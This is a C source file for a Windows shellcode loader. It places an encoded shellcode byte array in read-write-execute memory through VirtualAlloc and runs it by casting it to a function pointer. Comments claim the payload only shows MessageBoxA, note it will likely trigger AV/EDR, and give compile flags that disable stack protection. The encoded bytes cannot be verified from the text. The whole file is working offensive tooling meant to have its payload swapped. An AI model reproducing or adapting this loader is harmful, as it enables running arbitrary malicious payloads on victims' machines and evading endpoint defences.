#include <stdio.h>
#include <windows.h>

// A simple, non-encrypted shellcode "loader" in C. 
//Will more than likely always trigger AV/EDR solutions in its current form.
// Will execute MessageBoxA() unless shellcode is changed.
// Compile: gcc loader.c -o loader.exe -z execstack -fno-stack-protector -no-pie

unsigned char shellcode[] =
"\xd9\xe5\xd9\x74\x24\xf4\x5d\x29\xc9\xb8\x7f\xc6\xd8\x83"
"\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\x3a\xd5\x3a\x76\x38"
"\x31\x38\x79\xc0\xc2\x5d\xf3\x25\xf3\x5d\x67\x2e\xa4\x6d"
"\xe3\x62\x49\x05\xa1\x96\xda\x6b\x6e\x99\x6b\xc1\x48\x94"
"\x6c\x7a\xa8\xb7\xee\x81\xfd\x17\xce\x49\xf0\x56\x17\xb7"
"\xf9\x0a\xc0\xb3\xac\xba\x65\x89\x6c\x31\x35\x1f\xf5\xa6"
"\x8e\x1e\xd4\x79\x84\x78\xf6\x78\x49\xf1\xbf\x62\x8e\x3c"
"\x09\x19\x64\xca\x88\xcb\xb4\x33\x26\x32\x79\xc6\x36\x73"
"\xbe\x39\x4d\x8d\xbc\xc4\x56\x4a\xbe\x12\xd2\x48\x18\xd0"
"\x44\xb4\x98\x35\x12\x3f\x96\xf2\x50\x67\xbb\x05\xb4\x1c"
"\xc7\x8e\x3b\xf2\x41\xd4\x1f\xd6\x0a\x8e\x3e\x4f\xf7\x61"
"\x3e\x8f\x58\xdd\x9a\xc4\x75\x0a\x97\x87\x11\xff\x9a\x37"
"\xe2\x97\xad\x44\xd0\x38\x06\xc2\x58\xb0\x80\x15\x9e\xeb"
"\x75\x89\x61\x14\x86\x80\xa5\x40\xd6\xba\x0c\xe9\xbd\x3a"
"\xb0\x3c\x11\x6a\x1e\xef\xd2\xda\xde\x5f\xbb\x30\xd1\x80"
"\xdb\x3b\x3b\xa9\x76\xc6\xac\x16\x2e\x10\xa4\xff\x2d\xa0"
"\xb0\xc6\xb8\x46\xd0\x28\xed\xd1\x4d\xd0\xb4\xa9\xec\x1d"
"\x63\xd4\x2f\x95\x80\x29\xe1\x5e\xec\x39\x96\xae\xbb\x63"
"\x31\xb0\x11\x0b\xdd\x23\xfe\xcb\xa8\x5f\xa9\x9c\xfd\xae"
"\xa0\x48\x10\x88\x1a\x6e\xe9\x4c\x64\x2a\x36\xad\x6b\xb3"
"\xbb\x89\x4f\xa3\x05\x11\xd4\x97\xd9\x44\x82\x41\x9c\x3e"
"\x64\x3b\x76\xec\x2e\xab\x0f\xde\xf0\xad\x0f\x0b\x87\x51"
"\xa1\xe2\xde\x6e\x0e\x63\xd7\x17\x72\x13\x18\xc2\x36\x23"
"\x53\x4e\x1e\xac\x3a\x1b\x22\xb1\xbc\xf6\x61\xcc\x3e\xf2"
"\x19\x2b\x5e\x77\x1f\x77\xd8\x64\x6d\xe8\x8d\x8a\xc2\x09"
"\x84";

int main()
{
    // Allocate memory for the shellcode contained within the buffer
    void *execShellcode = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Copy shellcode buffer to memory
    memcpy(execShellcode, shellcode, sizeof shellcode);
    
    printf("Shellcode length: %zu\n", sizeof(shellcode));

    printf("Executing shellcode...\n");
    
    // Execute shellcode
    ((void(*)())execShellcode)();
    
    // Exit gracefully and return 0
    exit(0);

}